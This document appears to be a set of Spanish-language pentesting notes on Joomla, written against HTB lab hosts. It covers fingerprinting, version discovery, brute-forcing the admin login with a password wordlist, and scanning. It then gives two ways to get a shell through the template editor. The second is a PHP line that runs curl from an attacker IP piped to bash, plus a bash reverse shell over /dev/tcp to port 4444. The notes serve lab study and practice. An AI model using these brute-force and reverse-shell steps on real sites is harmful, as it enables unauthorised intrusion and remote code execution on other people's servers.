#### Buscar en el código fuente si un sitio es joomla:

    curl -s http://dev.inlanefreight.local/ | grep Joomla

#### Buscar versión manualmente:

    curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

#### Brute-forcing:

    sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

#### Automated scan:

    perl joomscan.pl -u <site> --enumerate-components 
    


### Obteniendo una shell:

Podemos obtener una shell siguiendo un proceso parecido al de WP:
##### 1)Entramos al control panel y vamos a templates
##### 2)En templates vamos nuevamente a Templates
##### 3)Seleccionamos el template donde vamos a meter la shell dentro de la columna template(esto nos lleva al customizador)
##### 4)incertamos la shell en una página. Luego podemos llamarla con curl:

        
        curl -s http://app.inlanefreight.local/templates/<template>/<pagina>.php?0=id
### Obteniendo una shell 2:

##### agregar en una página un código php:
        <?php system("curl 10.10.14.70:8080/rev.sh|bash"); ?>

##### crear la shell
        echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh

##### iniciar un servidor python y un netcat

##### Llamar a la páginacon curl:

        curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"

##### Obtener una mejor shell:
        script /dev/null -c bash
